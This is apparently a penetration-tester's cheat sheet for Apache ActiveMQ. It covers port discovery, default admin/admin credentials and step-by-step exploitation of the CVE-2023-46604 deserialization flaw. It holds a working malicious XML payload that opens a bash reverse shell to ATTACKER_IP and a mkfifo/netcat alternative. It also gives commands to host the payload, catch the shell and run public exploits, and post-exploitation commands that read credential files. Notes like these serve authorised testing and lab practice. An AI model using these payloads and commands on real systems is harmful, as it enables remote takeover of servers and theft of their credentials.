# Apache ActiveMQ

Message broker software - often runs with elevated privileges.

---

## Discovery

**Default Ports:**
| Port | Service |
|------|---------|
| 8161 | Web Console (HTTP/Jetty) |
| 61616 | OpenWire transport |
| 61613 | STOMP |
| 61614 | HTTP/WebSocket |
| 5672 | AMQP |
| 1883 | MQTT |

```bash
# Nmap detection
nmap -sC -sV -p 8161,61616,61613,61614,5672,1883 $ip

# Look for
ActiveMQ OpenWire transport
basic realm=ActiveMQRealm
Jetty(9.4.x)
```

---

## Default Credentials

| Username | Password |
|----------|----------|
| `admin` | `admin` |
| (blank) | (blank) |

Web console: `http://TARGET:8161/admin/`

---

## CVE-2023-46604 - RCE (OpenWire Deserialization)

**Affected:** Apache ActiveMQ < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**Port:** 61616 (OpenWire transport)

### Exploit Repositories

```bash
# Go version (recommended)
git clone https://github.com/rootsecdev/CVE-2023-46604.git

# Python version
git clone https://github.com/evkl1d/CVE-2023-46604.git
```

### Malicious XML Payload

Create `poc-linux.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <value>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/9001 0&gt;&amp;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

Alternative payload (mkfifo):

```xml
<value>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc ATTACKER_IP 9001 &gt;/tmp/f</value>
```

### Exploitation Steps

```bash
# 1. Host the XML payload
python3 -m http.server 8000

# 2. Start listener
nc -nlvp 9001

# 3. Run exploit (Go version)
./ActiveMQ-RCE -i TARGET_IP -p 61616 -u http://ATTACKER_IP:8000/poc-linux.xml

# Python version
python3 exploit.py -i TARGET_IP -p 61616 -u http://ATTACKER_IP:8000/poc-linux.xml
```

### Verify Vulnerability

```bash
# If web server gets hit but no shell, check XML payload encoding
# Make sure &gt; for > and &amp; for &
```

---

## Post-Exploitation

ActiveMQ often runs as dedicated user:

```bash
# Check user
id
# uid=1000(activemq) gid=1000(activemq)

# Config files
ls -la /opt/apache-activemq-*/conf/
cat /opt/apache-activemq-*/conf/activemq.xml
cat /opt/apache-activemq-*/conf/jetty-realm.properties
cat /opt/apache-activemq-*/conf/credentials.properties
```

---

## References

- https://nvd.nist.gov/vuln/detail/CVE-2023-46604
- https://github.com/rootsecdev/CVE-2023-46604
- https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604
